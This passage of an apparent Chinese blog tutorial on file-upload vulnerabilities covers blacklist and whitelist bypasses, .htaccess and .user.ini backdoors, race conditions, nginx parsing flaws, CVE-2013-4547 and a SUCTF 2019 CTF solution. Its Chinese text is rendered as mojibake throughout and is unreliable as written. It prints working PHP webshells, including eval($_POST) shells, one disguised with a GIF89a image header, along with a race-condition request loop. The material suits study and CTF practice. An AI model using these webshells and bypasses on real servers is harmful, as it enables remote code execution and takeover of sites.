<p>ç”¨winhexã€010editorç­‰åå…­è¿›åˆ¶å¤„ç†å·¥å…·ï¼Œåœ¨æ•°æ®æœ€å‰é¢æ·»åŠ å›¾ç‰‡çš„æ–‡ä»¶å¤´ï¼Œä»è€Œç»•è¿‡æ£€æµ‹ï¼Œæˆ–è€…ä½ ç›´æ¥åœ¨åŒ…çš„å¤´å†™ä¸ªGIF89aä¹Ÿæ˜¯å¯ä»¥è¿‡çš„</p>
<h3 id="åç«¯æ£€æµ‹æ–‡ä»¶æ‹“å±•å"><a href="#åç«¯æ£€æµ‹æ–‡ä»¶æ‹“å±•å" class="headerlink" title="åç«¯æ£€æµ‹æ–‡ä»¶æ‹“å±•å"></a>åç«¯æ£€æµ‹æ–‡ä»¶æ‹“å±•å</h3><p>ç”¨æ‹“å±•åçš„é»‘åå•æ¥æ£€æµ‹æ–‡ä»¶æ‹“å±•åä»è€Œé˜²æ­¢å±é™©æ–‡ä»¶çš„ä¸Šä¼ </p>
<p>ç»•è¿‡:</p>
<p>1)ä½¿ç”¨ä¸€äº›ç‰¹æ®Šæ‰©å±•åæ¥ç»•è¿‡,<code>php</code>å¯ä»¥ç”¨php3ã€php4ã€php5ä»£æ›¿</p>
<p>2)å¤§å°å†™æ··æ·†ç»•è¿‡</p>
<p>3)åœ¨æ–‡ä»¶åååŠ <code>.</code>(ç©ºæ ¼ï¼Œç‚¹ï¼Œç©ºæ ¼)ï¼Œåˆ©ç”¨windowsç‰¹æ€§ç»•è¿‡</p>
<p>4)åœ¨æ–‡ä»¶åååŠ <code>::$data</code>ç»•è¿‡(<strong>NTFSæµ</strong>è¯»å…¥)</p>
<p>5)æœ‰æ›¿æ¢çš„è¯å¯ä»¥åŒå†™ç»•è¿‡</p>
<hr>
<p>å½“ç„¶ä¹Ÿå¯ä»¥æ˜¯ç™½åå•åªè®©ç‰¹å®šçš„æ–‡ä»¶ä¸Šä¼ </p>
<p>ç»•è¿‡:</p>
<p>å­˜å‚¨è·¯å¾„å¯ä»¥ä½¿ç”¨%00åœ¨æœ€åè¿›è¡Œæˆªæ–­ï¼Œï¼ˆæ³¨æ„ï¼šGETå‹å¯ä»¥å¯¹%00è‡ªåŠ¨è§£ç ï¼Œä½†POSTå‹ä¸èƒ½ï¼Œéœ€è¦åœ¨äºŒè¿›åˆ¶ä¸­ä¿®æ”¹&#x2F;&#x2F;æ‰“å¼€ä½ çš„010å–µï¼Œç”¨ç©ºæ ¼å ä¸ªä½æ¥è¾“00ï¼‰</p>
<h3 id="åç«¯æ£€æµ‹æ–‡ä»¶å†…å®¹"><a href="#åç«¯æ£€æµ‹æ–‡ä»¶å†…å®¹" class="headerlink" title="åç«¯æ£€æµ‹æ–‡ä»¶å†…å®¹"></a>åç«¯æ£€æµ‹æ–‡ä»¶å†…å®¹</h3><h4 id="æ–‡ä»¶å†…å®¹æ›¿æ¢"><a href="#æ–‡ä»¶å†…å®¹æ›¿æ¢" class="headerlink" title="æ–‡ä»¶å†…å®¹æ›¿æ¢"></a>æ–‡ä»¶å†…å®¹æ›¿æ¢</h4><p>æ£€æµ‹åŸç†ï¼š</p>
<p>åœ¨åç«¯å¤„ç†ä¸Šä¼ çš„æ–‡ä»¶æ—¶ï¼Œä¼šå°†å°†æ–‡ä»¶ä¸­çš„æ•æ„Ÿå­—ç¬¦æ›¿æ¢æ‰ã€‚<br>å‚è€ƒä»£ç </p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$path</span> = <span class="string">&quot;./uploads&quot;</span>;
<span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);
<span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="variable">$content</span>);
<span class="variable">$file</span> = <span class="variable">$path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];

<span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$file</span>)) &#123;
        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$content</span>);
        <span class="keyword">echo</span> <span class="string">&#x27;Success!&lt;br&gt;&#x27;</span>;
&#125; <span class="keyword">else</span> &#123;
        <span class="keyword">echo</span> <span class="string">&#x27;Error!&lt;br&gt;&#x27;</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>

<p>ç»•è¿‡æ–¹æ³•ï¼š<br>æ ¹æ®å®é™…è¿‡æ»¤çš„å­—ç¬¦æ¥åˆ¤æ–­ï¼Œï¼ˆä¸€èˆ¬ä¸ä¼šé™åˆ¶æ‰€æœ‰æ•æ„Ÿå­—ç¬¦ï¼Œå› ä¸ºè¿˜è¦å…¼é¡¾å›¾ç‰‡ä¸Šä¼ ï¼‰</p>
<h4 id="å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“"><a href="#å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“"></a>å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“</h4><p>æ£€æµ‹åŸç†ï¼š<br>åç«¯è°ƒç”¨äº†<code>php</code>çš„GDåº“ï¼Œæå–äº†æ–‡ä»¶ä¸­çš„å›¾ç‰‡æ•°æ®ï¼Œç„¶åå†é‡æ–°æ¸²æŸ“ï¼Œè¿™æ ·å›¾ç‰‡ä¸­æ’å…¥çš„æ¶æ„ä»£ç å°±ä¼šè¢«è¿‡æ»¤æ‰äº†</p>
<p>ç»•è¿‡æ–¹æ³•ï¼š<br>æ¯”è¾ƒè¿‡æ»¤å‰åæ–‡ä»¶å†…å®¹ï¼Œä¸€èˆ¬ä¸ä¼šå…¨éƒ¨è¿‡æ»¤ã€‚<br>æ¯”è¾ƒä½¿ç”¨<code>php-gd</code>è½¬æ¢ä¹‹å‰å’Œä¹‹åçš„gifå›¾åƒï¼Œå¹¶æœç´¢å®ƒä»¬ä¹‹é—´çš„ä»»ä½•ç›¸ä¼¼æ€§ï¼Œå› æ­¤ï¼Œå¦‚æœæˆ‘åœ¨åŸå§‹æ–‡ä»¶ä¸­æ‰¾åˆ°ç›¸ä¼¼çš„éƒ¨åˆ†ï¼Œåˆ™åœ¨ä½¿ç”¨<code>php-gd</code>è½¬æ¢åä¹Ÿä¿ç•™äº†è¯¥éƒ¨åˆ†ç„¶åæˆ‘å¯ä»¥åœ¨é‚£éƒ¨åˆ†æ³¨å…¥æˆ‘çš„PHPä»£ç å¹¶è·å¾—RCE</p>
<h3 id="æ¡ä»¶ç«äº‰"><a href="#æ¡ä»¶ç«äº‰" class="headerlink" title="æ¡ä»¶ç«äº‰"></a>æ¡ä»¶ç«äº‰</h3><p>è¯¥æ¼æ´å½¢æˆé€»è¾‘ï¼š<br>ç½‘ç«™å…è®¸ä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åæ£€æŸ¥ä¸Šä¼ æ–‡ä»¶æ˜¯å¦åŒ…å«<code>webshell</code>ã€æ˜¯å¦æ˜¯æŒ‡å®šçš„æ–‡ä»¶ç±»å‹ã€‚å¦‚æœä¸æ˜¯ï¼Œé‚£ä¹ˆåˆ é™¤è¯¥æ–‡ä»¶ã€‚åœ¨åˆ é™¤ä¹‹å‰è®¿é—®ä¸Šä¼ çš„<code>php</code>æ–‡ä»¶ï¼Œä»è€Œæ‰§è¡Œä¸Šä¼ æ–‡ä»¶ä¸­çš„<code>php</code>ä»£ç ã€‚</p>
<p>ç»•è¿‡æ–¹æ³•ï¼š<br>å…ˆè¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œåè¿›è¡Œåˆ¤æ–­ä¸åˆ é™¤ã€‚åˆ©ç”¨æ—¶é—´å·®è¿›è¡Œ<code>webshell</code>ä¸Šä¼ ã€‚<br>ç«äº‰æ¡ä»¶ä»£ç ä¸¾ä¾‹ï¼š</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
	<span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($\_POST\[&quot;cmd&quot;\])?&gt;&#x27;</span>);
<span class="meta">?&gt;</span></code></pre>

<p>åˆ¤æ–­æ˜¯å¦åˆ é™¤</p>
<pre><code class="highlight python"><span class="keyword">import</span> requests  
<span class="keyword">while</span> true:  
	requests.get(â€è·¯å¾„â€œ)</code></pre>

<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>å½“æ–‡ä»¶å®Œå…¨è¢«banï¼Œåªç”¨ä»¥å›¾ç‰‡ç±»å‹ä¸Šä¼ çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¯¥æ€ä¹ˆåŠå‘¢</p>
<h3 id="ä¸Šä¼ -htaccessæ–‡ä»¶ç»•è¿‡"><a href="#ä¸Šä¼ -htaccessæ–‡ä»¶ç»•è¿‡" class="headerlink" title="ä¸Šä¼ .htaccessæ–‡ä»¶ç»•è¿‡"></a>ä¸Šä¼ .htaccessæ–‡ä»¶ç»•è¿‡</h3><p><code>.htaccess</code>æ–‡ä»¶æ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œå®ƒé‡Œé¢å­˜æ”¾ç€ApacheæœåŠ¡å™¨é…ç½®ç›¸å…³çš„æŒ‡ä»¤ã€‚</p>
<p><code>.htaccess</code>ä¸»è¦çš„ä½œç”¨æœ‰ï¼šURLé‡å†™ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€MIMEç±»å‹é…ç½®ä»¥åŠè®¿é—®æƒé™æ§åˆ¶ç­‰ã€‚ä¸»è¦ä½“ç°åœ¨ä¼ªé™æ€çš„åº”ç”¨ã€å›¾ç‰‡é˜²ç›—é“¾ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€é˜»æ­¢&#x2F;å…è®¸ç‰¹å®šIP&#x2F;IPæ®µã€ç›®å½•æµè§ˆä¸ä¸»é¡µã€ç¦æ­¢è®¿é—®æŒ‡å®šæ–‡ä»¶ç±»å‹ã€æ–‡ä»¶å¯†ç ä¿æŠ¤ç­‰ã€‚</p>
<p><code>.htaccess</code>çš„ç”¨é€”èŒƒå›´ä¸»è¦é’ˆå¯¹å½“å‰ç›®å½•</p>
<p>ç±»ä¼¼å†…å®¹</p>
<pre><code class="highlight plaintext">ForceType application/x-httpd-php
SetHandler application/x-httpd-php
è¿™äº›éƒ½ä¼šæŠŠä¸Šä¼ çš„æ–‡ä»¶å¼ºåˆ¶è§£æä¸ºphp</code></pre>

<h3 id="ä¸Šä¼ -user-iniæ–‡ä»¶ç»•è¿‡"><a href="#ä¸Šä¼ -user-iniæ–‡ä»¶ç»•è¿‡" class="headerlink" title="ä¸Šä¼ .user.iniæ–‡ä»¶ç»•è¿‡"></a>ä¸Šä¼ .user.iniæ–‡ä»¶ç»•è¿‡</h3><p><code>.user.ini</code>ã€‚å®ƒæ¯”<code>.htaccess</code>ç”¨çš„æ›´å¹¿ï¼Œä¸ç®¡æ˜¯<code>nginx/apache/IIS</code>ï¼Œåªè¦æ˜¯ä»¥<strong>fastcgi</strong>è¿è¡Œçš„<code>php</code>éƒ½å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•ã€‚</p>
<p>é‚£ä¹ˆä»€ä¹ˆæ˜¯<code>.user.ini</code>ï¼Ÿè¿™å¾—ä»<code>php.ini</code>è¯´èµ·äº†ã€‚<code>php.ini</code>æ˜¯<code>php</code>é»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…æ‹¬äº†å¾ˆå¤š<code>php</code>çš„é…ç½®ï¼Œè¿™äº›é…ç½®ä¸­ï¼Œåˆåˆ†ä¸ºå‡ ç§ï¼š<em>PHP_INI_SYSTEM</em>ã€<em>PHP_INI_PERDIR</em>ã€<em>PHP_INI_ALL</em>ã€<em>PHP_INI_USER</em>ã€‚åœ¨æ­¤å¯ä»¥æŸ¥çœ‹ï¼š<a href="http://php.net/manual/zh/ini.list.php">http://php.net/manual/zh/ini.list.php</a> è¿™å‡ ç§æ¨¡å¼æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿçœ‹çœ‹å®˜æ–¹çš„è§£é‡Šï¼š</p>
<p><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/kisakiayano/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/8d6872811ad6ca771a0debab4f7a50ce.png" alt="img"></p>
<p>é™¤äº†ä¸» <code>php.ini </code>ä¹‹å¤–ï¼ŒPHP è¿˜ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æ‰«æ INI æ–‡ä»¶ï¼Œä»è¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web æ ¹ç›®å½•ï¼ˆ<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> æ‰€æŒ‡å®šçš„ï¼‰ã€‚å¦‚æœè¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–ï¼Œåˆ™åªæ‰«æè¯¥ç›®å½•ã€‚</p>
<p>åœ¨ <code>.user.ini</code> é£æ ¼çš„ INI æ–‡ä»¶ä¸­åªæœ‰å…·æœ‰ <code>PHP_INI_PERDIR</code> å’Œ <code>PHP_INI_USER</code> æ¨¡å¼çš„ INI è®¾ç½®å¯è¢«è¯†åˆ«ã€‚</p>
<p>æ‰€ä»¥é™¤äº†<code>PHP_INI_SYSTEM</code>ä»¥å¤–çš„æ¨¡å¼ï¼ˆåŒ…æ‹¬<code>PHP_INI_ALL</code>ï¼‰éƒ½æ˜¯å¯ä»¥é€šè¿‡<code>.user.ini</code>æ¥è®¾ç½®çš„ã€‚æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°å€ŸåŠ©<code>.user.ini</code>æ–‡ä»¶ï¼Œæ›´æ”¹<code>auto_prepend_file</code>é…ç½®é¡¹ï¼Œæ¥æ„é€ ä¸€ä¸ªâ€œåé—¨â€ã€‚</p>
<p>æ¯”å¦‚ï¼ŒæŸç½‘ç«™é™åˆ¶ä¸å…è®¸ä¸Šä¼ <code>.php</code>æ–‡ä»¶ï¼Œä½ ä¾¿å¯ä»¥ä¸Šä¼ ä¸€ä¸ª<code>.user.ini</code>ï¼Œå†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼ŒåŒ…å«èµ·æ¥è¿›è¡Œ<code>getshell</code>ã€‚ä¸è¿‡å‰ææ˜¯å«æœ‰<code>.user.ini</code>çš„æ–‡ä»¶å¤¹ä¸‹éœ€è¦æœ‰æ­£å¸¸çš„<code>php</code>æ–‡ä»¶ï¼Œå¦åˆ™ä¹Ÿä¸èƒ½åŒ…å«äº†ã€‚å†æ¯”å¦‚ï¼Œä½ åªæ˜¯æƒ³éšè—ä¸ªåé—¨ï¼Œè¿™ä¸ªæ–¹å¼æ˜¯æœ€æ–¹ä¾¿çš„ã€‚</p>
<p>å®ä¾‹([SUCTF 2019]CheckIn1):</p>
<pre><code class="highlight javascript">$userdir = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_">md5</span>($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);
<span class="keyword">if</span> (!<span class="title function_">file_exists</span>($userdir)) &#123;
    <span class="title function_">mkdir</span>($userdir, <span class="number">0777</span>, <span class="literal">true</span>);
&#125;
<span class="title function_">file_put_contents</span>($userdir . <span class="string">&quot;/index.php&quot;</span>, <span class="string">&quot;&quot;</span>);
<span class="keyword">if</span> (<span class="title function_">isset</span>($_POST[<span class="string">&quot;upload&quot;</span>])) &#123;
    $tmp_name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];
    $name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;name&quot;</span>];
    <span class="keyword">if</span> (!$tmp_name) &#123;
        <span class="title function_">die</span>(<span class="string">&quot;filesize too big!&quot;</span>);
    &#125;
    <span class="keyword">if</span> (!$name) &#123;
        <span class="title function_">die</span>(<span class="string">&quot;filename cannot be empty!&quot;</span>);
    &#125;
    $extension = <span class="title function_">substr</span>($name, <span class="title function_">strrpos</span>($name, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);
    <span class="keyword">if</span> (<span class="title function_">preg_match</span>(<span class="string">&quot;/ph|htaccess/i&quot;</span>, $extension)) &#123;
        <span class="title function_">die</span>(<span class="string">&quot;illegal suffix!&quot;</span>);
    &#125;
    <span class="keyword">if</span> (<span class="title function_">mb_strpos</span>(<span class="title function_">file_get_contents</span>($tmp_name), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="variable constant_">FALSE</span>) &#123;
        <span class="title function_">die</span>(<span class="string">&quot;&amp;lt;? in contents!&quot;</span>);
    &#125;
    $image_type = <span class="title function_">exif_imagetype</span>($tmp_name);
    <span class="keyword">if</span> (!$image_type) &#123;
        <span class="title function_">die</span>(<span class="string">&quot;exif_imagetype:not image!&quot;</span>);
    &#125;
    $upload_file_path = $userdir . <span class="string">&quot;/&quot;</span> . $name;
    <span class="title function_">move_uploaded_file</span>($tmp_name, $upload_file_path);
    echo <span class="string">&quot;Your dir &quot;</span> . $userdir. <span class="string">&#x27; &lt;br&gt;&#x27;</span>;
    echo <span class="string">&#x27;Your files : &lt;br&gt;&#x27;</span>;
    <span class="title function_">var_dump</span>(<span class="title function_">scandir</span>($userdir));
&#125;</code></pre>

<p><strong>ç»•è¿‡æŠ€å·§</strong>ï¼š</p>
<p>1.é’ˆå¯¹è¿‡æ»¤åŒ…å«<code>ph</code>ä¸<code>htaccess</code>æ‰©å±•åçš„æ–‡ä»¶ï¼šä¸Šä¼ <code>.user.ini</code>ä¸å›¾ç‰‡é©¬ï¼Œåˆ©ç”¨<code>.user.ini</code>è¿›è¡Œæ–‡ä»¶åŒ…å«2.é’ˆå¯¹è¿‡æ»¤æ–‡ä»¶å†…å®¹åŒ…å«<code>&lt;?</code>çš„æ–‡ä»¶ï¼šä½¿ç”¨<code>php</code>çš„è„šæœ¬æ ‡è®°é£æ ¼<code>&lt;script language=&#39;php&#39;&gt;</code>3.é’ˆå¯¹ä½¿ç”¨<code>exif_imagetype</code>è§„å®šäº†å¿…é¡»ä¸ºå›¾ç‰‡ç±»å‹çš„æ–‡ä»¶ï¼šæ·»åŠ æ–‡ä»¶å¤´å†…å®¹æˆ–åˆæˆå›¾ç‰‡é©¬ï¼ˆç¨åä¼šè®²ï¼‰</p>
<p>é¦–å…ˆä¸Šä¼ <code>.user.ini</code>æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸ºï¼š</p>
<pre><code class="highlight javascript"><span class="title class_">GIF89</span>a
auto_prepend_file=shell.<span class="property">png</span></code></pre>

<p>ç„¶åæ„é€ ä¸€ä¸ª<code>shell.png</code>ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight javascript"><span class="title class_">GIF89</span>a
&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt; @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;hack&#x27;</span>]); &lt;/script&gt;</code></pre>

<p>ç„¶åå°†ä¸¤ä¸ªæ–‡ä»¶åˆ†åˆ«ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šï¼Œæ‹¿åˆ°å›æ˜¾</p>
<h3 id="å¥‡å¥‡æ€ªæ€ªçš„ç»•è¿‡"><a href="#å¥‡å¥‡æ€ªæ€ªçš„ç»•è¿‡" class="headerlink" title="å¥‡å¥‡æ€ªæ€ªçš„ç»•è¿‡"></a>å¥‡å¥‡æ€ªæ€ªçš„ç»•è¿‡</h3><p>åˆ©ç”¨ä¸€ä¸‹æ–‡ä»¶åŒ…å«ä¸Šä¼ ä¸€ä¸ªå‹ç¼©åŒ…æ¥getshell</p>
<p>è¿™é‡Œä¸ç»†è®²</p>
<h2 id="Ngnixè§£ææ¼æ´"><a href="#Ngnixè§£ææ¼æ´" class="headerlink" title="Ngnixè§£ææ¼æ´"></a>Ngnixè§£ææ¼æ´</h2><h3 id="æ–‡ä»¶è§£ææ¼æ´"><a href="#æ–‡ä»¶è§£ææ¼æ´" class="headerlink" title="æ–‡ä»¶è§£ææ¼æ´"></a>æ–‡ä»¶è§£ææ¼æ´</h3><p>å¯¹äºä»»æ„æ–‡ä»¶åï¼Œåœ¨åé¢æ·»åŠ <code>/abc.php</code>(abcä¸ºä»»æ„å­—ç¬¦)åï¼Œå³å¯å°†æ–‡ä»¶ä½œä¸ºphpè§£æ</p>
<p><strong>æ¼æ´æœºç†</strong></p>
<p>Nginxé…ç½®å¯¼è‡´ï¼Œè€Œénginxç‰ˆæœ¬é—®é¢˜ï¼Œè€Œå–å†³äºphpçš„é…ç½®æ–‡ä»¶ php.ini æ–‡ä»¶ä¸­æ˜¯å¦å¼€å¯äº†<code> cgi.fix_pathinfo</code></p>
<p>å½“è®¿é—®<code>xxx.jpg/abc.php</code>æ—¶ï¼ŒnginxæŸ¥çœ‹URLåå‘ç°ä»¥phpç»“å°¾ï¼Œå¹¶å°†è·¯å¾„ä¼ é€’ç»™<code>phpfastcgi</code>å¤„ç†ç¨‹åºï¼Œphpçœ‹åˆ°<code>xxx.jpg/abc.php</code>ä¸å­˜åœ¨ï¼Œä¾¿åˆ é™¤å»æœ€åçš„<code>/abc.php</code>ï¼Œçœ‹åˆ°<code>xxx.jpg</code>å­˜åœ¨ï¼Œè€Œåä»¥<code>php</code>çš„å½¢å¼æ‰§è¡Œ<code>xxx.jpg</code>çš„å†…å®¹</p>
<p>å¤§æ¦‚çš„æ¥è¯´ï¼Œå°±æ˜¯<code>cgi.fix_pathinfo</code>ä¼šå¯¹å½¢å¦‚<code>/1.aaa/2.bbb/3.cccc</code>çš„æ–‡ä»¶è·¯å¾„è¿›è¡Œå¤„ç†ï¼Œè‹¥è¯¥è·¯å¾„ä¸å­˜åœ¨ï¼Œåˆ™ä¼šå»æ‰æœ€åçš„å­è·¯å¾„å†æ¬¡åˆ¤æ–­ç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªå­˜åœ¨çš„è·¯å¾„ã€‚</p>
<p>è‹¥å…³é—­è¯¥é€‰é¡¹ï¼Œè®¿é—®<code>/xxx.jpg/abc.php</code>ä¼šè¿”å›æ‰¾ä¸åˆ°æ–‡ä»¶ï¼Œä½†å…³é—­è¯¥é€‰é¡¹å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›å…¶ä»–é”™è¯¯ï¼Œæ‰€ä»¥é»˜è®¤å¼€å¯ã€‚</p>
<p>åœ¨é«˜ç‰ˆæœ¬ä¸­ï¼Œå¼•å…¥äº†<code>security.limit_extensions</code>æ¥çº æ­£è¿™ä¸ªé”™è¯¯ï¼Œé™åˆ¶äº†å¯æ‰§è¡Œæ–‡ä»¶çš„åç¼€ï¼Œé»˜è®¤åªå…è®¸æ‰§è¡Œ<code>.php</code>æ–‡ä»¶ã€‚é˜²æ­¢è¿™ä¸€é—®é¢˜(å›æ˜¾Access denied)</p>
<h3 id="ç©ºå­—èŠ‚RCE"><a href="#ç©ºå­—èŠ‚RCE" class="headerlink" title="ç©ºå­—èŠ‚RCE"></a>ç©ºå­—èŠ‚RCE</h3><p>Nginxåœ¨é‡åˆ°%00ç©ºå­—èŠ‚æ—¶ä¸åæ®µ<code>FastCGI</code>å¤„ç†ä¸ä¸€è‡´ï¼Œå¯¼è‡´å¯ä»¥åœ¨å›¾ä¸­åµŒå…¥PHPä»£ç ç„¶åé€šè¿‡è®¿é—®<code>1.jpg%00.php</code>æ¥æ‰§è¡Œå…¶ä¸­çš„ä»£ç ã€‚</p>
<p><strong>å½±å“ç‰ˆæœ¬</strong></p>
<pre><code class="highlight plaintext">nginx 0.5.*
nginx 0.6.*
nginx 0.7 &lt;= 0.7.65
nginx 0.8 &lt;= 0.8.37</code></pre>

<p>è¯¥æ¼æ´ä¸å—cgi.fix_pathinfoå½±å“ï¼Œå½“ä¸º0æ—¶ï¼Œä¾æ—§å¯ä»¥è§£æ</p>
<h3 id="CVE-2013-4547-20-00"><a href="#CVE-2013-4547-20-00" class="headerlink" title="CVE-2013-4547(%20%00)"></a>CVE-2013-4547(%20%00)</h3><p><strong>å½±å“ç‰ˆæœ¬</strong></p>
<pre><code class="highlight plaintext">nginx 0.8.41 ~ 1.5.6</code></pre>

<p>åŸç†æ˜¯éæ³•å­—ç¬¦ç©ºæ ¼å’Œæˆªæ­¢ç¬¦ï¼ˆ%00ï¼‰ä¼šå¯¼è‡´Nginxè§£æURIæ—¶çš„æœ‰é™çŠ¶æ€æœºæ··ä¹±ï¼Œå±å®³æ˜¯å…è®¸æ”»å‡»è€…é€šè¿‡ä¸€ä¸ªéç¼–ç ç©ºæ ¼ç»•è¿‡åç¼€åé™åˆ¶ã€‚æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾æœåŠ¡å™¨ä¸Šå­˜åœ¨æ–‡ä»¶ï¼šâ€œfile.jpg â€ï¼Œæ³¨æ„æ–‡ä»¶åçš„æœ€åä¸€ä¸ªå­—ç¬¦æ˜¯ç©ºæ ¼ã€‚åˆ™å¯ä»¥é€šè¿‡è®¿é—®ï¼š<code>http://127.0.0.1/file.jpg \0.php</code> </p>
<p>è®©Nginxè®¤ä¸ºæ–‡ä»¶â€œfile.jpg â€çš„åç¼€ä¸º<code>.php</code></p>
<p>æ¥æµ‹è¯•ä¸‹ï¼Œè¿™æ¬¡æµ‹è¯•åœ¨Nginx&#x2F;1.0.15ä¸­è¿›è¡Œã€‚é¦–å…ˆå‡†å¤‡ä¸€å¼ å›¾ç‰‡ï¼Œå‘½åä¸ºâ€œtest.html â€ï¼Œæ³¨æ„ï¼Œæ–‡ä»¶åå«æœ‰ç©ºæ ¼ã€‚ç„¶ååœ¨æµè§ˆå™¨ä¸­è®¿é—®è¯¥æ–‡ä»¶ï¼Œä¼šå¾—åˆ°ä¸€ä¸ª404ï¼Œå› ä¸ºæµè§ˆå™¨è‡ªåŠ¨å°†ç©ºæ ¼ç¼–ç ä¸º%20ï¼ŒæœåŠ¡å™¨ä¸­ä¸å­˜åœ¨æ–‡ä»¶â€œtest.html%20â€ã€‚</p>
<p>æµ‹è¯•ç›®æ ‡æ˜¯è¦è®©Nginxè®¤ä¸ºè¯¥æ–‡ä»¶æ˜¯å›¾ç‰‡æ–‡ä»¶å¹¶æ­£ç¡®åœ°åœ¨æµè§ˆå™¨ä¸­æ˜¾ç¤ºå‡ºæ¥ã€‚æˆ‘ä»¬æƒ³è¦çš„æ˜¯æœªç»ç¼–ç çš„ç©ºæ ¼å’Œæˆªæ­¢ç¬¦ï¼ˆ\0ï¼‰ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿä½¿ç”¨Burp SuiteæŠ“å–æµè§ˆå™¨å‘å‡ºçš„è¯·æ±‚åŒ…ï¼Œä¿®æ”¹ä¸ºæˆ‘ä»¬æƒ³è¦çš„æ ·å­ï¼ŒåŸæœ¬çš„URLæ˜¯ï¼š<code>http://192.168.56.101/test.htmlAAAjpg </code>,å°†ç¬¬ä¸€ä¸ªâ€œAâ€æ”¹æˆâ€œ20â€ï¼ˆç©ºæ ¼ç¬¦å·çš„ASCIIç ï¼‰ï¼Œå°†ç¬¬äºŒä¸ªâ€œAâ€æ”¹æˆâ€œ00â€ï¼ˆæˆªæ­¢ç¬¦ï¼‰ï¼Œå°†ç¬¬ä¸‰ä¸ªâ€œAâ€æ”¹æˆâ€œ2eâ€ï¼ˆâ€œ.â€çš„ASCIIç ï¼‰ï¼Œå¦‚å›¾<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1964477-20200308194656774-1403436835.png" alt="1964477-20200308194656774-1403436835"></p>
<p>ä¿®æ”¹å®Œæ¯•åForwardè¯¥è¯·æ±‚ï¼Œåœ¨æµè§ˆå™¨ä¸­çœ‹åˆ°ï¼š</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1964477-20200308194716298-1059932045.png" alt="1964477-20200308194716298-1059932045"></p>
<p>æˆ‘ä»¬å·²ç»æˆåŠŸåœ°åˆ©ç”¨äº†æ¼æ´ï¼ä½†è¿™æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿæˆ‘ä»¬æƒ³è¦çš„æ˜¯ä»£ç è¢«æ‰§è¡Œã€‚</p>
<p>ç»§ç»­æµ‹è¯•ï¼Œå‡†å¤‡æ–‡ä»¶â€œtest.jpg â€ï¼Œæ³¨æ„æ–‡ä»¶åçš„æœ€åä¸€ä¸ªå­—ç¬¦æ˜¯ç©ºæ ¼ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚æ–‡ä»¶å†…å®¹ä¸ºï¼š</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></code></pre>

